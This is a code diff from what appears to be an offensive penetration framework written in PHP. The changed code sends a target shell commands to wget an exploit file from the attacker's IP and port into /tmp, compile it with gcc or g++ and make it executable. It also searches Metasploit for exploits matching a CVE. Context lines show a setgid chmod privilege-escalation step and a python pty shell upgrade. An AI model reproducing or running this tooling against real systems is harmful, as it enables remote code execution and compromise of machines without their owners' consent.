@@ -254,13 +254,13 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
             $this->article("EXTENSION",$obj_file->file_ext);
             $this->requette("cp -v $obj_file->file_path $this->dir_tmp/$obj_file->file_name$obj_file->file_ext ");
             
-            if (is_resource($stream)){
+            
                 $ip_attacker = $this->ip4addr4target($this->ip);
                 //$this->requette("gedit $obj_file->file_path");
                 $this->tcp2open4server($ip_attacker, $this->port_rfi);
                     $data = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O  /tmp/$obj_file->file_name$obj_file->file_ext "; //
-                    $this->lan2stream4result($data,$this->stream_timeout);
-            }
+                    $this->req_str($stream,$data,$this->stream_timeout,"");
+            
             
 
             
@@ -269,14 +269,14 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
                     $option_compile = trim($obj_file->req_ret_str("grep -i -E \"(gcc |cc |clang )\" $obj_file->file_path | grep -Po \"(gcc |cc |clang )[[:print:]]{1,}\" "));
                     $this->article("OPT GCC",$option_compile);
                     $data = "gcc -ggdb -w $options_compiler /tmp/$obj_file->file_name$obj_file->file_ext -o /tmp/$obj_file->file_name.elf && chmod +x /tmp/$obj_file->file_name.elf"; //
-                    $this->req_str($stream,$data,10);
+                    $this->req_str($stream,$data,10,"");
                     return "/tmp/$obj_file->file_name.elf" ;
                     
                 case ($obj_file->file_ext==".cpp") :
                     $option_compile = trim($obj_file->req_ret_str("grep -i -E \"(gcc |cc |clang |g\+\+ |compile )\" $obj_file->file_path | grep -Po \"(gcc |cc |clang |g\+\+ |compile )[[:print:]]{1,}\" "));
                     $this->article("OPT G++",$option_compile);
                     $data = "g++ /tmp/$obj_file->file_name$obj_file->file_ext -o /tmp/$obj_file->file_name.elf $options_compiler && chmod +x /tmp/$obj_file->file_name.elf"; //
-                    $this->req_str($stream,$data,10);
+                    $this->req_str($stream,$data,10,"");
                     return "/tmp/$obj_file->file_name.elf" ;
                     
                 case ($obj_file->file_ext==".py") :
@@ -290,7 +290,8 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
                 case ($obj_file->file_ext==".rb") :
                     $query = "cat $obj_file->file_path | grep \"Name\" | cut -d '>' -f2 | cut -d',' -f1";
                     $search_msf = $this->req_ret_str($query);
-                    //if(!empty($search_msf)) echo $obj_file->msf2search2info($search_msf);
+                    if(!empty($search_msf)) echo $obj_file->msf2search2info($search_msf);
+                    
                     return "ruby /tmp/$obj_file->file_name$obj_file->file_ext" ;
 
                 case ($obj_file->file_ext=="") :
@@ -1076,7 +1077,8 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
     public function msf2search($cve){
         $this->ssTitre(__FUNCTION__);
         $cve = trim($cve);
-        $query = "msfconsole -q -x \"search type:exploit -name $cve;exit\" 2> /dev/null  | grep -i \"exploit/\" | awk '{print $2}' | grep \"exploit/\" " ;
+        $cve = str_replace("'", "", $cve);
+        $query = "msfconsole -q -x \"search type:exploit -name \\\"$cve\\\";exit\" 2> /dev/null  | grep -i \"exploit/\" | awk '{print $2}' | grep \"exploit/\" " ;
         return $this->req_ret_tab($query);        
     } 
     
